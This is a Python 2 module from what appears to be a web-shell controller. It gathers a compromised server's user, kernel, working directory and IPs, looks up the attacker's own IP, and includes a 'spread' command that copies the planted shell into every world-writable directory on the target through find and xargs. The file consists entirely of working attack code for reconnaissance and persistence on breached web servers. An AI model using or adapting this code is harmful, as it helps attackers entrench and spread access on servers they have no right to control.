from urllib2 import urlopen, URLError
from request_info import request_type
from menu import Colors, getargs


class ServerInfo(object):
    '''
    ServerInfo class is used for getting information
    About the server like user, kernerl, cwd, IPs, etc
    It also has some methods to extend the usage of the
    Shell
    '''
    def __init__(self, url=None):
        self.url = url

    def get_information(self):
        try:
            # call get_page_source() method then assign it to self.source
            self.source = map(str.strip, request_type.get_page_source().readlines())
            # get the attacker's ip address thx to g0tmi1k and hostess
            local_ip = (urlopen('http://ifconfig.me/ip').read()).strip()
        except URLError:
            local_ip = 'Unknown'

        # adding another command requires editing two modules
        # 1st- define the method here "server_info.py" module
        # then add a logic statment in "executer.py" module
        available_commands = ['exit', 'clear', 'history', 'info', 'banner', 'writable', 'spread']
        self.info = \
        '''
        {dashed}
        {red}User{end}     :  {green}{current_user}{end}
        {red}ID{end}       :  {green}{current_id}{end}
        {red}Kernel{end}   :  {green}{kernel_info}{end}
        {red}CWD{end}      :  {green}{cwd}{end}
        {red}Host IPs{end} :  {green}{host_ip}{end}
        {red}Local IP{end} :  {green}{local_ip}{end}
        {dashed}

        {hot}[+] Available commands: {available_commands}.{end}
        {hot}[+] Inserting{end} {red}!{end} {hot}at the begining of the command will execute it on your box.{end}
        '''.format(dashed='-' * int(len(self.source[2]) + 12),
                red=Colors.RED, green=Colors.GREEN, end=Colors.END, hot=Colors.HOT,
                current_user=self.source[0],
                current_id=self.source[1],
                kernel_info=self.source[2],
                cwd=self.source[3],
                host_ip=', '.join(self.source[4:]),
                local_ip=local_ip,
                available_commands=available_commands,)
        return self.info

    # a method to get all writable directories within CWD
    def get_writable(self):
        request_type.cmd = "find {} -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print".format(self.source[3])
        self.writables = map(str.strip, request_type.get_page_source().readlines())
        c = 1
        for path in self.writables:
            print '{0:2d}- {1}'.format(c, path)
            c += 1

    # a method to spread the shell in all writable directories
    def spread_shell(self):
        provided_shell_name = raw_input('\n{0}[!] Current shell name{1}: '.format(Colors.RED, Colors.END))
        shell_name = getargs.url.split('/')[-1] if getargs.method == 'post' else provided_shell_name
        request_type.cmd = 'find {0} -xdev -type d \( -perm -0002 -a ! -perm -1000 \) | xargs -n 1 cp {1}'.format(self.source[3], shell_name)
        print request_type.get_page_source().read()
        print '[+] Successfully wrote {0} to some writable paths\n[+] Type writable to check dirs'.format(shell_name)

# taking an instance from ServerInfo class
serverinfo = ServerInfo()
